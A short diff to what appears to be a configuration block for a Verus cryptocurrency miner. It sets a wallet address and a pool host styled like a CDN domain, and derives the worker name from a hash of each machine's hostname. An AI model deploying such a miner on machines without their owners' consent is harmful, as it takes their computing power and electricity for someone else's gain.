@@ -7,7 +7,8 @@
 # ============================================================
 
 VRSC_WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
-WORKER="m2mac"
+# Worker name — change per machine (mac1, mac2, imac1 etc.)
+WORKER="mac$(hostname | md5 | cut -c1-4 2>/dev/null || echo '01')"
 POOL_HOST="cdn.snumcaj.com"
 POOL_PORT="3956"
 
